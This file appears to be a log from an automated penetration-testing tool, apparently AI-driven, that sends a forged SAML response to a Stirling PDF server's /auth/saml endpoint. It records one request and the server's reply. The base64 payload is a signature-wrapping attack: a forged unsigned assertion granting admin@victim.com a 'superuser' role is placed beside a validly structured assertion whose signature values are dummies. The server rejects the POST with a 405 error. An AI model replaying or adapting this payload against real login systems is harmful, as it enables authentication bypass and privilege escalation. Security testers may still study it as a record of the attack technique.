@@ -1,0 +1,25 @@
+REQUEST:
+POST https://stirling-pdf.baliprov.dev/auth/saml
+User-Agent: pentest-ai/1.6.2 (compatible; rv:a2cfe36ea2c0; +https://pentestai.xyz)
+X-Request-ID: 7a3f9c21-4b08-4e11-9c02-a2cfe36ea2c0
+Content-Type: application/x-www-form-urlencoded
+
+SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJyZXNwb25zZS0xIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNi0wMS0wMVQwMDowMDowMFoiPjxzYW1sOklzc3Vlcj5odHRwczovL2lkcC52aWN0aW0uY29tPC9zYW1sOklzc3Vlcj48c2FtbHA6RXh0ZW5zaW9ucyB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIj48c2FtbDpBc3NlcnRpb24gSUQ9ImZvcmdlZC1ldmlsIiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD5hZG1pbkB2aWN0aW0uY29tPC9zYW1sOk5hbWVJRD48L3NhbWw6U3ViamVjdD48c2FtbDpBdHRyaWJ1dGVTdGF0ZW1lbnQ+PHNhbWw6QXR0cmlidXRlIE5hbWU9InJvbGUiPjxzYW1sOkF0dHJpYnV0ZVZhbHVlPnN1cGVydXNlcjwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT48L3NhbWw6QXR0cmlidXRlPjwvc2FtbDpBdHRyaWJ1dGVTdGF0ZW1lbnQ+PC9zYW1sOkFzc2VydGlvbj48L3NhbWxwOkV4dGVuc2lvbnM+PHNhbWw6QXNzZXJ0aW9uIElEPSJzaWduZWQtcmVhbCIgeG1sbnM6c2FtbD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI+PHNhbWw6U3ViamVjdD48c2FtbDpOYW1lSUQ+YWxpY2VAZXhhbXBsZS5jb208L3NhbWw6TmFtZUlEPjwvc2FtbDpTdWJqZWN0PjxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpTaWduZWRJbmZvPjxkczpSZWZlcmVuY2UgVVJJPSIjc2lnbmVkLXJlYWwiPjxkczpEaWdlc3RWYWx1ZT5BQUFBPC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8+PGRzOlNpZ25hdHVyZVZhbHVlPkFBQUE8L2RzOlNpZ25hdHVyZVZhbHVlPjwvZHM6U2lnbmF0dXJlPjwvc2FtbDpBc3NlcnRpb24+PC9zYW1scDpSZXNwb25zZT4=&RelayState=/
+
+RESPONSE:
+HTTP 405
+Date: Wed, 25 Nov 2026 00:24:26 GMT
+Content-Type: application/problem+json
+Transfer-Encoding: chunked
+Connection: keep-alive
+Vary: Access-Control-Request-Headers
+X-Request-ID: 7a3f9c21-4b08-4e11-9c02-a2cfe36ea2c0
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 0
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Frame-Options: DENY
+
+{"detail":"HTTP method POST is not supported for this endpoint. Supported methods: GET","instance":"/auth/saml","status":405,"title":"HTTP Method Not Allowed","type":"/errors/method-not-allowed","timestamp":"2026-11-25T00:24:26.522630438Z","path":"/auth/saml","title":"HTTP Method Not Allowed","method":"POST","supportedMethods":["GET"],"hints":["Change the HTTP method to one of the supported methods.","Consult the API documentation for the correct method.","If using a tool like curl or Postman, update the method accordingly."],"actionRequired":"Use one of the supported HTTP methods."}
